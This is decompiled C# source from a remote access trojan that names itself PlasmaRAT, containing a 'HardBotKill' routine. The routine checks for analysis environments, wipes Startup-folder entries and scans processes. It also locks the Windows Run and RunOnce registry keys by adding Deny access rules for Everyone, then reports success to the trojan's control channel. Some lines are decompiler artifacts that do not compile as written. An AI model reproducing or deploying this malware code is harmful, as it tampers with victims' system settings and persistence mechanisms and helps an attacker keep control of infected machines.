using System;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace System_Configuration
{
	// Token: 0x02000011 RID: 17
	[StandardModule]
	internal sealed class HardBK
	{
		// Token: 0x0600005C RID: 92 RVA: 0x0000602C File Offset: 0x0000422C
		public static object HardBotKill()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (AntiEverything.AntisDetected)
				{
					goto IL_AB;
				}
				IL_13:
				num2 = 3;
				BotKillers.RunStartupKiller();
				IL_1A:
				num2 = 4;
				HardBK.KillKeys(Registry.CurrentUser.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\Run", true));
				IL_32:
				num2 = 5;
				HardBK.KillKeys(Registry.CurrentUser.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true));
				IL_4A:
				num2 = 6;
				BotKillers.KillFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
				IL_57:
				num2 = 7;
				if (!AntiEverything.IsAdmin())
				{
					goto IL_91;
				}
				IL_60:
				num2 = 8;
				HardBK.KillKeys(Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\Run", true));
				IL_78:
				num2 = 9;
				HardBK.KillKeys(Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true));
				IL_91:
				num2 = 11;
				BotKillers.ScanProcess();
				IL_99:
				num2 = 12;
				PlasmaRAT.TalktoChannel("BK: Hard Bot Killer Ran Successfully!", string.Empty);
				IL_AB:
				goto IL_135;
				IL_B0:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_F6:
				goto IL_12A;
				IL_F8:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_108:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_F8;
			}
			IL_12A:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_135:
			object obj3;
			object result = obj3;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00006194 File Offset: 0x00004394
		public static object KillKeys(RegistryKey wat)
		{
			try
			{
				SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
				NTAccount ntaccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
				string identity = ntaccount.ToString();
				RegistrySecurity registrySecurity = new RegistrySecurity();
				registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
				registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
				wat.SetAccessControl(registrySecurity);
				wat.Close();
			}
			catch (Exception ex)
			{
			}
			object result;
			return result;
		}
	}
}
